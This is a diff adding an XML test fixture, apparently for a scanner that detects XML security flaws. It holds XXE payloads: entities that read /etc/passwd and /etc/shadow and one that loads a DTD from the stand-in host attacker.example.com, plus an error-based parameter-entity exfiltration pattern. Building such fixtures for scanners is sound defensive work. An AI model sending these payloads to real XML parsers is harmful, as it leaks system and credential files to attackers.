@@ -1,0 +1,19 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- VULNERABLE FIXTURE — scan-xml-security test -->
+
+<!-- XML-001: XXE — external entity injection -->
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+  <!ENTITY remote SYSTEM "http://attacker.example.com/evil.dtd">
+]>
+<config>
+  <output>&xxe;</output>
+  <data>&remote;</data>
+</config>
+
+<!-- XML-002: Inline DTD with parameter entity -->
+<!DOCTYPE data [
+  <!ENTITY % file SYSTEM "file:///etc/shadow">
+  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+]>
+<root/>
